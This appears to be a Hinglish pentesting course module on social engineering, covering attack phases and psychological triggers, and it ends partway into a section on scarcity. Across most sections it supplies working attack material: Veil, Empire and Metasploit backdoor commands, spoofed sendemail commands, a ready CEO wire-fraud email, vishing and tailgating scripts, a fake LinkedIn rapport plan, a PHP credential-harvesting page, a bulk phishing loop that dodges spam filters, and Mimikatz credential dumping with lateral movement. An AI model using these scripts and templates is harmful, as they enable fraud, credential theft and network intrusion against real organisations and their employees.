
# üéØ Module 1: Foundation & Human Psychology

---

## üìö Topic 1.1: Social Engineering Kya Hai?

### üéØ Topic/Technique:
**Social Engineering** - Logon ko manipulate karke unse sensitive information nikalna ya unhe kuch karne par majboor karna.

### ü§î Yeh Kya Hai?
Social Engineering ek psychological attack hai jismein attacker insaan ki kamzoriyon (trust, fear, greed) ka faayda uthata hai, technical vulnerabilities ka nahi.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Companies apne systems ko secure kar leti hain lekin employees ko train nahi karti
- 90% successful breaches mein human element involved hota hai
- Technical defenses ko bypass karne ka sabse aasan tareeka hai
- Red Team assessments mein realistic attack simulation ke liye zaroori hai

### üéØ Practical Use (Asli Pentesting Mein):
- Employee awareness testing (phishing campaigns chalana)
- Physical security assessment (tailgating, badge cloning)
- Credential harvesting (fake login pages se passwords lena)
- Initial access gain karna network mein (backdoor deliver karna)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
1. **Information Gathering**: Target ke baare mein OSINT se data collect karna
2. **Pretext Building**: Ek believable story banana (jaise IT support, courier, etc.)
3. **Attack Execution**: Phishing email, vishing call, ya physical entry
4. **Exploitation**: Credentials lena, malware install karna, ya sensitive data access karna

### üëç Pros (Fayde):
- Technical skills ki zyada zaroorat nahi (psychology-based hai)
- Success rate bahut high hai (70-90% phishing campaigns mein)
- Expensive security tools ko bypass kar sakta hai
- Multiple attack vectors available hain (email, phone, physical, social media)

### üëé Cons (Nuksaan):
- Ethical concerns zyada hain (real people ko target karna padta hai)
- Legal issues ho sakte hain agar proper authorization na ho
- Time-consuming hai (research aur planning mein weeks lag sakte hain)
- Detection ke baad organization alert ho jata hai

### ‚å®Ô∏è Zaroori Commands & Steps:
Social Engineering ek methodology hai, specific commands nahi. Lekin pentesting phases yeh hain:

**Phase 1: Reconnaissance (Jaankari Ikhatta Karna)**
```
- Target company ki website analyze karna
- Employees ke social media profiles dekhna
- Email patterns identify karna (firstname.lastname@company.com)
- Technology stack pata karna (job postings se)
```

**Phase 2: Weaponization (Evil Files Banana)**
```
- Backdoors create karna (Veil, Empire, Fatrat)
- Phishing pages clone karna
- Malicious documents banana (macro-enabled Word/Excel)
```

**Phase 3: Delivery (Target Tak Pahunchana)**
```
- Phishing emails bhejna
- USB drops karna (parking lot, reception)
- Fake websites host karna
- Vishing calls karna
```

**Phase 4: Exploitation (Access Lena)**
```
- Credentials capture karna
- Reverse shell establish karna
- Privilege escalation karna
```

**Phase 5: Post-Exploitation**
```
- Lateral movement (network mein aage badhna)
- Data exfiltration
- Persistence maintain karna
```

### üíª Step-by-Step Example:
**Scenario: Ek company ke employee ko target karna hai**

**Step 1**: LinkedIn par target company search karo
- IT department ke employees dhundho
- Unke names, designations note karo
- Email pattern guess karo (john.doe@company.com)

**Step 2**: Maltego se information gather karo
- Company ke associated domains nikalo
- Email addresses confirm karo
- Social media profiles link karo

**Step 3**: Pretext decide karo
- "IT Security Team se urgent password reset required hai"
- Ya "HR se apka increment letter attached hai"

**Step 4**: Phishing email craft karo
```
Subject: [URGENT] Security Update Required
From: it-security@company.com (spoofed)

Dear John,

We detected suspicious activity on your account. 
Please verify your credentials immediately:
https://company-verify.com/login

Regards,
IT Security Team
```

**Step 5**: Fake login page host karo (SEToolkit se)
- Original company login page clone karo
- Credentials capture karne ke liye backend setup karo

**Step 6**: Email bhejo aur wait karo
- Agar victim credentials enter karta hai, tumhe mil jayenge
- Phir real system mein login karke access lo

### üí° Pro Tip / Galti:
**Pro Tip**: Hamesha "urgency" aur "authority" ka combination use karo. Jaise: "CEO ne kaha hai 2 ghante mein yeh form fill karna zaroori hai, warna account suspend ho jayega." Yeh victim ko sochne ka time nahi deta.

**Common Mistake**: Generic phishing emails bhejna (jaise "Dear User"). Hamesha personalized emails bhejo jismein victim ka naam, designation, ya recent company events ka reference ho. Isse trust badh jata hai aur success rate 3x ho jata hai.

---

## üìö Topic 1.2: Pentesting Phases (SE ke Context Mein)

### üéØ Topic/Technique:
**Penetration Testing Lifecycle** - Social Engineering attacks ko systematic tareeke se execute karna.

### ü§î Yeh Kya Hai?
Pentesting ek structured process hai jismein 5 phases hote hain: Reconnaissance, Weaponization, Delivery, Exploitation, aur Post-Exploitation. Har phase ka apna goal aur tools hote hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Random attacks se better results nahi milte, systematic approach zaroori hai
- Client ko detailed report dene ke liye har phase document karna padta hai
- Legal protection ke liye proper methodology follow karna zaroori hai
- Repeatability aur consistency maintain karne ke liye framework chahiye

### üéØ Practical Use (Asli Pentesting Mein):
- Red Team engagements mein realistic attack simulation
- Security awareness training programs design karna
- Incident response teams ko train karna
- Organization ki security posture assess karna

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Phase 1: Reconnaissance (OSINT)**
- Passive: Google dorking, social media stalking, public records
- Active: Port scanning, email verification, phone number lookup

**Phase 2: Weaponization**
- Backdoors banana (Veil, Empire, Fatrat)
- Phishing pages clone karna
- Malicious documents create karna

**Phase 3: Delivery**
- Email phishing
- USB drops
- Watering hole attacks
- Physical intrusion

**Phase 4: Exploitation**
- Credentials capture
- Malware execution
- Privilege escalation

**Phase 5: Post-Exploitation**
- Lateral movement
- Data exfiltration
- Persistence
- Covering tracks

### üëç Pros (Fayde):
- Organized approach se success rate badhta hai
- Client ko clear deliverables mil jate hain
- Legal issues se bachne mein madad karta hai
- Team collaboration easy ho jata hai

### üëé Cons (Nuksaan):
- Time-consuming process hai (weeks lag sakte hain)
- Har phase mein detection ka risk hota hai
- Agar ek phase fail ho jaye toh pura attack ruk sakta hai
- Documentation overhead zyada hota hai

### ‚å®Ô∏è Zaroori Commands & Steps:

**Phase 1: Reconnaissance Commands**
```bash
# Company ke emails dhundhna
theHarvester -d company.com -b google

# Subdomains enumerate karna
sublist3r -d company.com

# Social media usernames dhundhna
sherlock username123

# Phone number intelligence
phoneinfoga scan -n +919876543210

# Google dorking
site:company.com filetype:pdf "confidential"
```

**Phase 2: Weaponization Commands**
```bash
# Veil se backdoor banana
veil
use evasion
use 15
set LHOST 192.168.1.10
set LPORT 443
generate

# Empire se macro banana
powershell-empire client
usestager windows/macro
set Listener http
execute
```

**Phase 3: Delivery Commands**
```bash
# Email spoofing
sendemail -f ceo@company.com -t victim@company.com \
-u "Urgent: Board Meeting" -m "Please review attached" \
-a malicious.docx -s smtp.gmail.com:587

# Phishing page host karna
setoolkit
1 (Social Engineering)
2 (Website Attack Vectors)
3 (Credential Harvester)
2 (Site Cloner)
```

**Phase 4: Exploitation Commands**
```bash
# Metasploit listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 192.168.1.10
set LPORT 443
exploit
```

**Phase 5: Post-Exploitation Commands**
```bash
# Meterpreter commands
sysinfo
getuid
screenshot
keyscan_start
hashdump
run post/windows/gather/credentials/credential_collector
```

### üíª Step-by-Step Example:

**Real-World Scenario: Corporate Phishing Campaign**

**Step 1: Reconnaissance (Week 1)**
```bash
# Company info gather karo
whois company.com
theHarvester -d company.com -b all
maltego (transform: Email to Person)

# Result: 50 employee emails mil gaye
# Pattern: firstname.lastname@company.com
```

**Step 2: Weaponization (Week 2)**
```bash
# Macro-enabled document banana
powershell-empire client
usestager windows/macro
set Listener http
set Outfile /var/www/html/payload.txt

# Document prepare karo
# "Q4_Financial_Report.docm" naam rakho
# Andar macro paste karo
# Social engineering text add karo: "Enable macros to view content"
```

**Step 3: Delivery (Week 3)**
```bash
# Phishing email craft karo
Subject: Q4 Financial Results - Confidential
From: cfo@company.com (spoofed)
Body: "Dear Team, Please review attached Q4 report before tomorrow's board meeting."
Attachment: Q4_Financial_Report.docm

# Email bhejo
sendemail -f cfo@company.com -t employees@company.com \
-u "Q4 Financial Results - Confidential" \
-m "Please review attached" \
-a Q4_Financial_Report.docm
```

**Step 4: Exploitation (Week 3-4)**
```bash
# Empire listener already running
# Victim ne document khola aur macros enable kiye
# Agent active ho gaya

powershell-empire client
agents
interact AGENT_NAME
shell whoami
shell ipconfig
```

**Step 5: Post-Exploitation (Week 4)**
```bash
# Credentials dump karo
usemodule credentials/mimikatz/logonpasswords
execute

# Lateral movement
usemodule lateral_movement/invoke_psexec
set ComputerName DC01
set Listener http
execute

# Data exfiltration
download C:\Users\victim\Documents\*.xlsx
```

### üí° Pro Tip / Galti:

**Pro Tip**: Har phase ke baad "pause and assess" karo. Agar reconnaissance mein hi 100 emails mil gaye, toh pehle 10 par test karo. Agar 3 victims ne click kiya (30% success rate), toh baaki 90 par full campaign chalao. Isse detection risk kam hota hai aur approach refine ho jata hai.

**Common Mistake**: Sabhi phases ek saath rush karna. Jaise reconnaissance incomplete hai lekin weaponization start kar diya. Result: Generic payload banaya jo kisi ke kaam nahi aaya. Hamesha ek phase complete karo, results analyze karo, phir next phase mein jao. Patience is key!

---

## üìö Topic 1.3: Psychological Trigger - Authority (Adhikaar)

### üéØ Topic/Technique:
**Authority Principle** - Logon ko yeh believe dilana ki aap ek powerful position se belong karte ho (CEO, Police, IT Admin).

### ü§î Yeh Kya Hai?
Authority ek psychological trigger hai jismein log automatically un logon ki baat maan lete hain jo power position mein hote hain. Yeh human nature hai ki hum authority figures ko question nahi karte.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- 85% successful vishing attacks mein authority ka use hota hai
- Employees apne boss ya IT department se aaye requests ko blindly follow karte hain
- Physical pentesting mein (badge cloning, tailgating) authority dikhana zaroori hai
- Quick compliance milta hai bina zyada convincing ke

### üéØ Practical Use (Asli Pentesting Mein):
- **CEO Fraud**: CFO ko email bhejo "Urgent wire transfer needed"
- **IT Support Scam**: "Your password expired, reset karo immediately"
- **Police Impersonation**: Physical entry ke liye "Security audit chal raha hai"
- **Vendor Impersonation**: "Server maintenance ke liye access chahiye"

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Psychology Behind It:**
1. **Milgram Experiment**: 65% log authority figure ke kahne par harmful actions bhi karte hain
2. **Hierarchical Obedience**: Office culture mein boss ki baat manna mandatory hai
3. **Fear of Consequences**: Agar authority ko ignore kiya toh job loss ka dar

**Attack Flow:**
```
Attacker ‚Üí Authority Persona (CEO/IT/Police) ‚Üí Urgent Request ‚Üí Victim Complies ‚Üí Access Gained
```

### üëç Pros (Fayde):
- Sabse effective psychological trigger hai (success rate 70-80%)
- Minimal technical skills required
- Quick results milte hain (victim turant action leta hai)
- Multiple scenarios mein use ho sakta hai (email, phone, physical)

### üëé Cons (Nuksaan):
- Agar victim verify kar le toh pakde jaoge
- High-profile impersonation (CEO, Police) legal issues create kar sakta hai
- Ek baar detection ke baad organization alert ho jata hai
- Requires good acting skills (especially vishing mein)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Email Spoofing (Authority Dikhane Ke Liye)**
```bash
# CEO se email bhejna
sendemail -f ceo@company.com \
-t finance@company.com \
-u "URGENT: Wire Transfer Required" \
-m "Please transfer $50,000 to vendor account immediately. Board meeting in 1 hour." \
-s smtp.gmail.com:587 \
-xu your_email@gmail.com \
-xp your_password

# IT Admin se email
sendemail -f it-admin@company.com \
-t employees@company.com \
-u "Password Reset Required - Security Policy" \
-m "Click here to reset: http://fake-portal.com/reset" \
-s smtp.gmail.com:587
```

**Vishing Script (Phone Call)**
```
Caller ID Spoofing: Use SpoofCard ya Twilio

Script:
"Hello, this is John from IT Security Department. 
We detected unauthorized access attempt on your account. 
For security verification, I need your employee ID and current password. 
This is urgent as your account will be locked in 10 minutes."
```

**Physical Entry (Badge Cloning)**
```
Scenario: Security Auditor bano

Props needed:
- Professional attire (suit, tie)
- Fake ID badge (Photoshop se banao)
- Clipboard with official-looking documents
- Confident body language

Script:
"Hi, I'm from corporate security. We're conducting surprise audit today. 
Can you let me in? I need to check server room access logs."
```

### üíª Step-by-Step Example:

**Scenario: CEO Fraud Attack (Business Email Compromise)**

**Step 1: Reconnaissance**
```bash
# CEO ka naam aur email pattern nikalo
LinkedIn: "Company Name" + "CEO"
Result: John Smith, CEO

# Email pattern confirm karo
theHarvester -d company.com -b linkedin
Pattern: john.smith@company.com

# CFO ka email dhundho (target)
Result: sarah.jones@company.com (CFO)
```

**Step 2: Email Crafting**
```
From: john.smith@company.com (spoofed)
To: sarah.jones@company.com
Subject: URGENT: Confidential Acquisition

Sarah,

I'm in a board meeting and can't talk. We're finalizing acquisition deal.

Need immediate wire transfer:
Amount: $85,000
Account: [Attacker's account details]
Reason: Legal fees for due diligence

This is time-sensitive. Board needs confirmation in 2 hours.
Do NOT discuss with anyone - NDA signed.

Regards,
John Smith
CEO, Company Inc.
Sent from my iPhone
```

**Step 3: Delivery**
```bash
# Email bhejo (Friday 4 PM - jab log jaldi mein hote hain)
sendemail -f john.smith@company.com \
-t sarah.jones@company.com \
-u "URGENT: Confidential Acquisition" \
-m "Email body..." \
-s smtp.gmail.com:587
```

**Step 4: Follow-up (Agar Response Nahi Aaya)**
```
# 30 minutes baad reminder bhejo
Subject: Re: URGENT: Confidential Acquisition

Sarah, did you process the transfer? 
Board is asking for update.

- John
```

**Step 5: Success Indicators**
```
- Victim replies: "Transfer initiated"
- Money received in attacker's account
- Victim realizes fraud after 24-48 hours (too late)
```

### üí° Pro Tip / Galti:

**Pro Tip**: Authority ko "urgency" ke saath combine karo. Sirf "I'm the CEO" bolne se kaam nahi chalega. Bolna padega: "I'm the CEO and board meeting is in 1 hour, agar yeh kaam nahi hua toh deal cancel ho jayegi aur company ko $10M loss hoga." Yeh victim ko panic mode mein daal deta hai aur woh bina soche action le leta hai.

**Common Mistake**: Over-acting karna. Agar tum phone par bolte ho "I AM THE CEO, DO AS I SAY!" toh victim ko shaq hoga. Natural bolo: "Hey Sarah, it's John. Listen, I'm stuck in a meeting but need your help with something urgent. Can you do me a favor?" Casual tone zyada believable hota hai kyunki real CEOs bhi aise hi baat karte hain apne trusted employees se.

**Real Example**: 2016 mein Snapchat ke CEO ka impersonation karke attacker ne HR se employee payroll data maang liya. HR ne bina verify kiye bhej diya kyunki "CEO ne maanga tha". Lesson: Authority works!

---

## üìö Topic 1.4: Psychological Trigger - Urgency & Fear (Jaldbaazi aur Dar)

### üéØ Topic/Technique:
**Urgency & Fear Principle** - Victim ko time pressure aur consequences ka dar dikhana taaki woh bina soche action le.

### ü§î Yeh Kya Hai?
Urgency aur Fear dono psychological triggers hain jo victim ke rational thinking ko disable kar dete hain. Jab kisi ko lagta hai ki "abhi nahi kiya toh bada nuksaan hoga", toh woh verification skip kar deta hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- 90% phishing emails mein urgency element hota hai
- Fear victim ko panic mode mein daal deta hai (rational thinking band ho jati hai)
- Quick action milta hai - victim verify karne ka time nahi leta
- Technical knowledge ki zaroorat nahi, pure psychology par based hai

### üéØ Practical Use (Asli Pentesting Mein):
- **Account Suspension Scam**: "Your account will be locked in 2 hours"
- **Security Breach Alert**: "Unauthorized login detected, reset password now"
- **Legal Threat**: "Copyright violation - respond in 24 hours or legal action"
- **Payment Failure**: "Your card declined, update immediately to avoid service disruption"

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Psychology Behind It:**
1. **Fight or Flight Response**: Fear activate hone par brain survival mode mein chala jata hai
2. **Time Scarcity**: Jab time kam ho toh decision quality kharab ho jati hai
3. **Loss Aversion**: Log gain se zyada loss se darte hain (account loss > account security)

**Attack Flow:**
```
Urgent Threat ‚Üí Fear Response ‚Üí Panic Decision ‚Üí Victim Clicks Link ‚Üí Credentials Stolen
```

**Common Fear Triggers:**
- Account suspension/deletion
- Legal action/lawsuit
- Job loss
- Financial loss
- Data breach exposure
- Virus infection

### üëç Pros (Fayde):
- Extremely high success rate (60-70% click rate)
- Works across all demographics (employees, executives, general public)
- Minimal setup required (simple email/SMS)
- Bypasses security awareness training (panic overrides training)

### üëé Cons (Nuksaan):
- Obvious urgency red flag ban sakta hai (trained users detect kar lete hain)
- Spam filters urgency keywords detect karte hain
- Ek baar victim realize kare toh organization alert ho jata hai
- Ethical concerns zyada hain (real stress create karta hai)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Phishing Email Templates (Urgency + Fear)**

```bash
# Template 1: Account Suspension
sendemail -f security@company.com \
-t victim@company.com \
-u "‚ö†Ô∏è URGENT: Account Suspension in 2 Hours" \
-m "We detected suspicious activity. Verify identity immediately: http://fake-verify.com" \
-s smtp.gmail.com:587
```

**Email Body Examples:**

**Example 1: IT Security Alert**
```
Subject: üö® CRITICAL: Unauthorized Access Detected

Your account was accessed from unknown location:
IP: 185.220.101.45 (Russia)
Time: 2:34 AM
Device: Unknown

IMMEDIATE ACTION REQUIRED:
Click here to secure account: [Phishing Link]

Failure to act within 1 HOUR will result in:
‚ùå Account permanent suspension
‚ùå Data loss
‚ùå HR investigation

IT Security Team
```

**Example 2: CEO Urgent Request**
```
Subject: URGENT - Need This Done NOW

I'm in client meeting and need financial report immediately.
Send Q4 numbers to my personal email: ceo_temp@gmail.com

This is time-sensitive - client waiting.
Don't reply, just send.

- John (CEO)
Sent from iPhone
```

**Example 3: Legal Threat**
```
Subject: FINAL NOTICE - Copyright Infringement Case #45821

Dear User,

Our client identified copyrighted material on your account.

Legal action will commence in 48 HOURS unless you:
1. Remove content immediately
2. Pay settlement fee: $500
3. Sign agreement: [Malicious Link]

Failure to comply = Court summons + $50,000 penalty

Law Firm LLC
```

**SMS Phishing (Smishing) with Urgency**
```bash
# Twilio API se SMS bhejo
curl -X POST https://api.twilio.com/2010-04-01/Accounts/YOUR_SID/Messages.json \
--data-urlencode "Body=ALERT: Your bank account has suspicious activity. Verify now: http://short.link/verify" \
--data-urlencode "From=+1234567890" \
--data-urlencode "To=+919876543210" \
-u YOUR_SID:YOUR_TOKEN
```

### üíª Step-by-Step Example:

**Scenario: Fake Security Breach Phishing Campaign**

**Step 1: Target Selection**
```bash
# Company employees ki email list banao
theHarvester -d targetcompany.com -b all > emails.txt

# 50 employees select karo (test group)
head -50 emails.txt > targets.txt
```

**Step 2: Phishing Page Setup**
```bash
# Company login page clone karo
cd /var/www/html
wget -mkEpnp https://targetcompany.com/login

# Credentials capture script add karo
nano login.php
```

**login.php (Backend)**
```php
<?php
$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

// Save credentials
file_put_contents('captured.txt', 
  "Email: $email | Pass: $password | IP: $ip\n", 
  FILE_APPEND);

// Redirect to real site
header('Location: https://targetcompany.com/login');
?>
```

**Step 3: Email Crafting (Urgency + Fear)**
```
From: security-alert@targetcompany.com (spoofed)
To: employees@targetcompany.com
Subject: üö® SECURITY BREACH - Immediate Action Required

CRITICAL SECURITY ALERT

We detected unauthorized access attempts on multiple employee accounts.

AFFECTED ACCOUNTS: 47
ATTACK SOURCE: Eastern Europe
TIME: Last 2 hours

YOUR ACCOUNT MAY BE COMPROMISED.

‚ö†Ô∏è MANDATORY ACTION (Next 3 hours):
1. Verify your identity: https://targetcompany-verify.com/secure
2. Reset password immediately
3. Enable 2FA

‚è∞ DEADLINE: Today 6:00 PM
‚ùå Non-compliance = Account suspension + HR review

This is NOT a drill. Act now.

IT Security Operations Center
```

**Step 4: Mass Email Delivery**
```bash
# Bulk email script
while read email; do
  sendemail -f security-alert@targetcompany.com \
  -t $email \
  -u "üö® SECURITY BREACH - Immediate Action Required" \
  -m "Email body..." \
  -s smtp.gmail.com:587
  sleep 5  # Avoid spam detection
done < targets.txt
```

**Step 5: Monitor Results**
```bash
# Real-time credential monitoring
tail -f /var/www/html/captured.txt

# Expected output:
# Email: john@company.com | Pass: Summer2024! | IP: 192.168.1.50
# Email: sarah@company.com | Pass: P@ssw0rd123 | IP: 192.168.1.51
```

**Step 6: Success Metrics**
```
Total Sent: 50 emails
Opened: 42 (84%)
Clicked: 31 (62%)
Credentials Entered: 23 (46%)

Success Rate: 46% (Industry average: 30%)
Reason: Urgency + Fear combination
```

### üí° Pro Tip / Galti:

**Pro Tip**: "Countdown timer" use karo emails mein. HTML email mein ek fake timer add karo jo dikhaye "Account suspension in: 01:47:32". Yeh visual urgency create karta hai aur victim ko lagta hai ki sach mein time khatam ho raha hai. Code:
```html
<div style="background:red; color:white; padding:20px; font-size:24px;">
‚è∞ Time Remaining: <span id="timer">01:59:45</span>
<script>
var time = 7185; // 2 hours in seconds
setInterval(function(){
  var h = Math.floor(time/3600);
  var m = Math.floor((time%3600)/60);
  var s = time%60;
  document.getElementById('timer').innerHTML = 
    h.toString().padStart(2,'0')+':'+
    m.toString().padStart(2,'0')+':'+
    s.toString().padStart(2,'0');
  time--;
}, 1000);
</script>
</div>
```

**Common Mistake**: Har sentence mein "URGENT" aur "IMMEDIATE" likhna. Yeh spam jaisa dikhta hai. Instead, ek baar subject mein urgency dikhao, phir body mein calmly explain karo ki "kya problem hai" aur "kya karna hai". Example:
- ‚ùå Bad: "URGENT!!! IMMEDIATE ACTION!!! CLICK NOW!!!"
- ‚úÖ Good: "We detected unusual activity. To protect your account, please verify your identity within 2 hours."

**Real Example**: 2020 mein COVID-19 ke time par attackers ne bheja: "Your company email quota exceeded due to remote work. Upgrade now or lose emails in 24 hours." 65% employees ne click kiya kyunki sach mein remote work se email traffic badh gaya tha. Lesson: Real events ke saath urgency mix karo!

---

## üìö Topic 1.5: Psychological Trigger - Social Proof & Liking (Bhedchaal aur Pasand)

### üéØ Topic/Technique:
**Social Proof & Liking Principle** - Log woh karte hain jo dusre log kar rahe hain, aur jinhe pasand karte hain unki baat maan lete hain.

### ü§î Yeh Kya Hai?
Social Proof: Jab log dekhte hain ki "sabhi log yeh kar rahe hain" toh woh bhi karte hain (herd mentality).
Liking: Log un logon ki baat zyada mante hain jinse unhe similarity feel hoti hai ya jo unhe pasand hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- 70% purchasing decisions social proof se influenced hote hain
- Employees apne colleagues ki actions ko blindly follow karte hain
- Rapport building se victim ka trust jeetna easy ho jata hai
- Physical pentesting mein "fitting in" zaroori hai (tailgating, badge cloning)

### üéØ Practical Use (Asli Pentesting Mein):
- **Fake Reviews/Testimonials**: "500+ employees already updated their passwords"
- **Colleague Impersonation**: "Hi, I'm from marketing team, we met at last year's party"
- **LinkedIn Connection**: Mutual connections dikhake trust build karna
- **Watering Hole**: Industry-specific forums/sites compromise karke "trusted source" banna

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Psychology Behind It:**

**Social Proof (Cialdini's Principle):**
1. **Informational Influence**: Jab situation unclear ho, log dusron ko dekh kar decide karte hain
2. **Normative Influence**: Log group mein fit hone ke liye majority ko follow karte hain
3. **FOMO (Fear of Missing Out)**: "Sabne kiya aur maine nahi kiya" ka dar

**Liking (Similarity & Rapport):**
1. **Similarity**: "Yeh banda mere jaisa hai" (same college, hometown, interests)
2. **Compliments**: Tareef sunke log open ho jate hain
3. **Cooperation**: "Hum ek team hain" feeling
4. **Physical Attractiveness**: Good-looking attackers ko zyada trust milta hai

**Attack Flow:**
```
Social Proof: "Everyone is doing it" ‚Üí Victim feels left out ‚Üí Takes action
Liking: Build rapport ‚Üí Victim trusts attacker ‚Üí Shares information
```

### üëç Pros (Fayde):
- Natural human behavior exploit karta hai (hard to defend against)
- Long-term relationships build kar sakte ho (advanced persistent threats)
- Multiple attack vectors (online + physical)
- Low suspicion (friendly approach hai, threatening nahi)

### üëé Cons (Nuksaan):
- Time-consuming (rapport building mein weeks lag sakte hain)
- Requires good social skills (introverts ke liye mushkil)
- Agar victim verify kar le toh exposed ho jaoge
- Scale karna mushkil hai (personalized approach chahiye)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Social Proof Implementation:**

**Example 1: Fake Update Notification**
```html
<!-- Phishing page par social proof add karo -->
<div style="background:#e8f5e9; padding:15px; margin:20px;">
  ‚úÖ 847 employees have already updated their security settings today
  ‚è∞ Update deadline: 6:00 PM
  üë• Your team: Marketing (12/15 completed)
</div>

<marquee>John D. just updated ‚Ä¢ Sarah M. just updated ‚Ä¢ Mike R. just updated</marquee>
```

**Example 2: Fake Testimonials**
```
"I updated my password in 2 minutes. Super easy!" - John, IT Dept
"Security team was very helpful. Highly recommend." - Sarah, HR
"Don't wait like I did. Update now!" - Mike, Sales

[Update Now Button]
```

**Liking Implementation:**

**LinkedIn Reconnaissance for Rapport Building**
```bash
# Target ki profile analyze karo
- Education: MIT (2015-2019)
- Hometown: Boston
- Interests: Photography, Hiking
- Mutual connections: 5

# Phishing email mein yeh details use karo
```

**Personalized Phishing Email (Liking)**
```
Subject: Fellow MIT Alum Here! üëã

Hi Sarah,

I noticed we both graduated from MIT around the same time! 
I'm now working with the IT security team here at [Company].

I'm reaching out because we're rolling out a new security protocol 
and I wanted to give you a heads up before the official announcement.

Could you help me test the new login system? 
It'll only take 2 minutes: [Phishing Link]

Also, I saw your hiking photos on LinkedIn - Appalachian Trail looks amazing! 
I'm planning a trip there next month. Any recommendations?

Thanks!
Alex
MIT '17 | IT Security Team
```

**Physical Social Engineering (Liking)**
```
Scenario: Office mein entry lena hai

Step 1: Dress code match karo (business casual if startup, formal if corporate)
Step 2: Coffee cup le jao (Starbucks - shows you're "one of them")
Step 3: Casual conversation start karo

Script:
"Hey! Rough Monday, right? [Laugh]
I'm Alex from the vendor team, here for server maintenance.
Badge reader isn't working - happens every time! [Eye roll]
Mind if I follow you in? I'll grab my temp badge from reception.
Thanks! By the way, love your [bag/watch/etc] - where'd you get it?"

[Victim lets you in because: similarity + casual + compliment]
```

### üíª Step-by-Step Example:

**Scenario: LinkedIn-Based Spear Phishing (Social Proof + Liking)**

**Step 1: Target Research**
```bash
# LinkedIn profile scraping
- Name: Sarah Johnson
- Company: TechCorp Inc.
- Position: Senior Developer
- Education: Stanford University (2016)
- Location: San Francisco
- Interests: AI/ML, Rock Climbing, Coffee
- Mutual Connections: 3 (John, Mike, Lisa)
```

**Step 2: Fake LinkedIn Profile Creation**
```
Name: Alex Chen
Photo: Professional headshot (stock photo)
Headline: "AI Engineer @ Google | Stanford Alum '15"
Location: San Francisco Bay Area
Connections: 500+ (bought fake connections)
Posts: Share AI/ML articles (look legitimate)
```

**Step 3: Connection Request (Liking)**
```
Hi Sarah,

I came across your profile and noticed we're both Stanford alums! 
I'm working on an AI project and your work on [recent project] caught my eye.

Would love to connect and exchange ideas!

Best,
Alex
```

**Step 4: Build Rapport (1-2 Weeks)**
```
Day 1: Connection accepted
Day 3: Like her recent post + comment: "Great insights on transformer models!"
Day 7: Share relevant article + tag her: "Thought you'd find this interesting"
Day 10: Direct message: "Hey! There's a Stanford AI meetup next week. Are you going?"
Day 14: Ready for attack
```

**Step 5: The Attack (Social Proof + Liking)**
```
Subject: Stanford AI Alumni - Exclusive Research Access üéì

Hey Sarah,

Hope you're doing well! 

I'm reaching out to Stanford CS alums about an exclusive opportunity.
Google Research is sharing early access to our new AI model (GPT-5 competitor).

So far, 50+ Stanford alumni have signed up including:
- John Martinez (your mutual connection)
- Dr. Lisa Wang (Stanford Professor)
- Mike Chen (OpenAI)

Access is limited to verified Stanford emails only.
Sign in here to claim your access: [Phishing Link]

This is a great networking opportunity too - there's a private Slack channel.

Let me know if you have questions!

Best,
Alex
Stanford '15 | AI Engineer @ Google
```

**Step 6: Phishing Page (Social Proof Elements)**
```html
<div class="header">
  <img src="stanford-logo.png">
  <h2>Stanford Alumni - Exclusive AI Research Access</h2>
</div>

<div class="social-proof">
  <h3>‚úÖ 127 Stanford Alumni Already Joined</h3>
  <div class="live-feed">
    <p>üü¢ John M. (Stanford '14) joined 5 minutes ago</p>
    <p>üü¢ Lisa W. (Stanford '12) joined 12 minutes ago</p>
    <p>üü¢ Mike C. (Stanford '16) joined 18 minutes ago</p>
  </div>
  
  <div class="testimonials">
    <p>"Amazing research! Glad I didn't miss out." - Sarah K., Stanford '15</p>
    <p>"This is exactly what I needed for my project." - Tom R., Stanford '13</p>
  </div>
</div>

<form action="capture.php" method="POST">
  <input type="email" placeholder="Stanford Email" required>
  <input type="password" placeholder="Password" required>
  <button>Access Research Portal</button>
</form>

<p style="color:red;">‚è∞ Access closes in: <span id="countdown">23:45:12</span></p>
```

**Step 7: Results**
```
Email Sent: 1 (targeted spear phishing)
Opened: Yes (rapport already built)
Clicked: Yes (social proof + liking + Stanford connection)
Credentials Entered: Yes

Success Rate: 100% (vs 30% for generic phishing)
Reason: Personalization + Social Proof + Liking combination
```

### üí° Pro Tip / Galti:

**Pro Tip**: "Mutual connections" ka screenshot fake karo aur email mein attach karo. Photoshop mein LinkedIn ka screenshot banao jismein dikhao ki "You, Sarah, and 5 others know John Martinez". Yeh instant trust create karta hai kyunki victim sochta hai "agar John isse jaanta hai toh yeh legitimate hoga". Bonus: John ka naam email body mein bhi mention karo: "John Martinez recommended I reach out to you."

**Common Mistake**: Sirf "everyone is doing it" bolna without proof. Generic statement "500 employees updated" se kaam nahi chalega. Instead, specific names use karo (victim ke team members ke fake names): "Your team: Marketing - John ‚úÖ, Sarah ‚úÖ, Mike ‚è≥ (pending), You ‚è≥ (pending)". Yeh victim ko lagta hai ki woh team mein akela reh gaya hai jo pending hai.

**Real Example**: 2019 mein attackers ne fake LinkedIn profiles banaye (500+ connections wale) aur Fortune 500 companies ke employees se connect kiye. 6 months rapport building ke baad, unhone "exclusive industry report" share kiya jo actually malware tha. 40% victims ne download kiya kyunki "trusted connection" se aaya tha. Lesson: Patience + Liking = High success rate!

---

## üìö Topic 1.6: Psychological Trigger - Scarcity & Baiting (Kami aur Laalach)

### üéØ Topic/Technique:
**Scarcity & Baiting Principle** - Limited availability dikhana (scarcity) aur free/valuable cheez ka lalach dena (baiting).

### ü§î Yeh Kya Hai?
Scarcity: "Yeh opportunity limited time ke liye hai" - FOMO create karta hai.
